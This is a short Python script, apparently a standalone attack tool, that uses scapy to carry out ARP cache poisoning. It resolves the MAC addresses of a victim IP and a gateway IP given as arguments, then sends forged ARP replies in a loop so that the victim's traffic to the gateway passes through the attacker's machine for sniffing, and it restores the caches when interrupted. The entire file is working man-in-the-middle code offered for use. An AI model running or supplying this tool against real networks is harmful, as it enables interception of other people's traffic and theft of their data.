#!/usr/bin/python

from getmac import get_mac_address as gma
from multiprocessing import Process, Manager
from scapy.all import ARP, Ether, send, srp
import argparse
import sys

# Get MAC address of given IP
def get_mac(ip):
	packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=ip)
	response, _ = srp(packet, timeout=2, retry = 10, verbose=False)
	for _, r in response:
		return r[Ether].src
	return None

def restore(victim, vmac, gateway, gmac):
	# Craft packets that restore original values
	victim_packet = ARP(
                    	op = 2,
                    	psrc = gateway,
                    	hwsrc = gmac,
                    	pdst = victim)
	gateway_packet = ARP(
                    	op = 2,
                    	psrc = victim,
                    	hwsrc = vmac,
                    	pdst = gateway)
   	 
    # Send original gateway values to the victim, and original victim values to the gateway
	send(victim_packet, count = 5, verbose=False)
	send(gateway_packet, count = 5, verbose=False)


def poison_arp(victim, vmac, gateway, gmac):
	# Create poisoned ARP packets intended for victim and gateway
	victim_packet = ARP(
        	op = 2,
        	psrc = gateway,
        	pdst = victim,
        	hwdst = vmac)
	gateway_packet = ARP(
        	op = 2,
        	psrc = victim,
        	pdst = gateway,
        	hwdst = gmac)

	print("[*] Beginning ARP poison. [CTRL-C to stop]")
    
	# Send poisoned packets in a loop to ensure ARP cache remains poisoned for sniffing
	while True:
		try:
			send(victim_packet, verbose=False)
			send(gateway_packet, verbose=False)
		except KeyboardInterrupt:
			print("\n[*] Stopping ARP poison and restoring original cache.")
			restore(victim, vmac, gateway, gmac)
			sys.exit()

def main():
	# Parse arguments from user; can provide port(s) or protocol(s) to sniff
	parser = argparse.ArgumentParser(description="Poison ARP cache of victim to redirect traffic for gateway to yourself")
	parser.add_argument('-v', '--victimip', required=True, help="IP address of victim")
	parser.add_argument('-g', '--gatewayip', required=True, help="IP address of gateway")
	args = parser.parse_args()

	# Get MAC address of victim and gateway
	vmac = get_mac(args.victimip)
	gmac = get_mac(args.gatewayip)
    
	print("[*] MAC of host:", gma())
	print("[*] MAC of victim gateway:", str(gmac))

	poison_arp(args.victimip, vmac, args.gatewayip, gmac)
   
if __name__ == '__main__':
    	main()